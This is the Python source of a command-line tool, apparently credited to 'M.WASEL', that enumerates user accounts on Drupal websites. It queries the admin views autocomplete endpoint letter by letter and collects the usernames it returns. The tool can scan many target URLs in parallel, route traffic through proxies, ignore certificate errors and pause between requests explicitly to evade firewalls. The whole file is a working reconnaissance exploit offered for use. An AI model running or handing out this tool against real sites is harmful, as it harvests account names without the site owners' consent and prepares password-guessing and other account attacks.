import argparse
import requests
import re
import time
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urljoin, urlparse
import concurrent.futures
from alive_progress import alive_bar  # Added for progress bar

# Suppress only the single InsecureRequestWarning (ignore SSL warnings)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Ominous banner
print(r'''
░█▀▄░█▀▄░█░█░█▀█░█▀█░█░░░░░▀█▀░█▀█░█▀▀░█▀█░█▀▄░█▄ ▄█ █▀█░▀█▀░▀█▀░█▀█░█▀█░░
░█░█░█▀▄░█░█░█▀▀░█▀█░█░░░░░░█░░█░█░█▀▀░█░█░█▀▄░█░█░█░█▀█░░█░░░█░░█░█░█░█░░
░▀▀░░▀░▀░▀▀▀░▀░░░▀░▀░▀▀▀░░░▀▀▀░▀░▀░▀░░░▀▀▀░▀░▀░▀░  ▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀
░█▀▄░▀█▀░█▀▀░█▀▀░█░░░█▀█░█▀▀░█░█░█▀▄░█▀▀
░█░█░░█░░▀▀█░█░░░█░░░█░█░▀▀█░█░█░█▀▄░█▀▀
░▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀    Created by: M.WASEL v1.1                                                                                                                                                                                                          
''')

def parse_arguments():
    parser = argparse.ArgumentParser(description="Drupal Username Enumeration Tool")
    parser.add_argument("-u", "--url", help="Single base URL to check")
    parser.add_argument("-l", "--url-list", help="File containing a list of base URLs to check")
    parser.add_argument("-s", "--save-file", help="Save the results to a file")
    parser.add_argument("-p", "--proxy", help="Proxy in the format 'host:port' (e.g., 127.0.0.1:8080)")
    return parser.parse_args()

def main():
    args = parse_arguments()

    if args.url:
        check_vulnerability_and_save(args.url, args.proxy, args.save_file)
    elif args.url_list:
        results = []  # Create an empty list to store results
        urls = read_url_list(args.url_list)
        check_vulnerability_for_multiple_urls(urls, args.proxy, args.save_file, results)
        save_results(results, args.save_file)
        
        # Prompt user to save results after scanning all hosts
        if not args.save_file:
            results_to_save = []
            for base_url, usernames in results:
                print(f"\nResults for {base_url} collected.")
                results_to_save.append((base_url, usernames))

            save_to_file = input("\nDo you want to save the results to a file? (yes/no): ").strip().lower()
            if save_to_file == "yes":
                file_name = input("Enter the file name (without extension, e.g., output): ").strip()
                save_results(results_to_save, file_name)
    else:
        print("Please provide either a single URL (-u) or a file containing a list of URLs (-l)")



def check_vulnerability_and_save(base_url, proxy=None, save_file=None):
    usernames = check_vulnerability(base_url, proxy)
    if save_file:
        save_results([(base_url, usernames)], save_file)
    else:
        # Prompt user to save results to a file
        save_to_file = input(f"Do you want to save the results for {base_url} to a file? (yes/no): ").strip().lower()
        if save_to_file == "yes":
            file_name = input("Enter the file name (without extension, e.g., output): ").strip()
            save_results([(base_url, usernames)], file_name)

def check_vulnerability_for_multiple_urls(urls, proxy=None, save_file=None, results=None):
    if results is None:
        results = []

    with alive_bar(len(urls), title='Scanning URLs', bar='classic') as bar:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future_to_url = {executor.submit(check_vulnerability, url, proxy): url for url in urls}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    usernames = future.result()
                    results.append((url, usernames))
                except Exception as exc:
                    print(f"Error for {url}: {exc}")
                bar()

def check_vulnerability(base_url, proxy=None):
    payload = "a"
    # Check the vulnerability for the provided base URL
    full_url = urljoin("https://" + base_url, "/admin/views/ajax/autocomplete/user")
    usernames = []

    try:
        response = requests.get(full_url, verify=False, proxies={"http": proxy, "https": proxy}, timeout=10)
        response.raise_for_status()

        # Extract the website name from the base URL
        website_name = urlparse(full_url).netloc

        print(f"\nChecking vulnerability on {website_name}...")

        if response.status_code == 200:
            print(f"{website_name} is vulnerable to Drupal username information disclosure! 😈🔓")

            # Extract usernames
            print(f"\nGrabbing the names from {website_name}...")

            for letter in "1234567890abcdefghijklmnopqrstuvwxyz":
                url = full_url + "/" + payload.replace("a", letter)

                try:
                    response = requests.get(url, verify=False, proxies={"http": proxy, "https": proxy}, timeout=10)
                    response.raise_for_status()

                    try:
                        result_text = response.text
                        matches = re.findall(r'"([^"]*)":\s*"[^"]*"', result_text)
                        usernames.extend(matches)

                        print(f"Letter {letter}: {matches}")

                    except ValueError:
                        print(f"Letter {letter}: Unexpected response format - Not a JSON")

                    time.sleep(1)  # Introduce a delay to outsmart firewalls

                except requests.exceptions.RequestException as e:
                    print(f"Letter {letter}: An error occurred - {e}")

            if usernames:
                print("\nUser enumeration has been completed! 😈🔓")
            else:
                print("\nNo usernames found.")

        else:
            print(f"{website_name} is not vulnerable. Status code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"https://{base_url} is not working. Error: {e}")

    return usernames

def save_results(results, save_file):
    if not results:
        print("No results to save.")
        return

    if save_file:
        if not save_file.endswith(".txt"):
            save_file += ".txt"
        with open(save_file, "w") as file:
            for base_url, usernames in results:
                file.write(f"Results for {base_url}:\n")
                for username in usernames:
                    file.write(f"{username}\n")
                file.write("\n")
        print(f"Results have been saved to {save_file}")
    else:
        print("\nNo file specified. Results will not be saved.")

def read_url_list(url_list_file):
    with open(url_list_file, "r") as file:
        return file.read().splitlines()

if __name__ == "__main__":
    main()
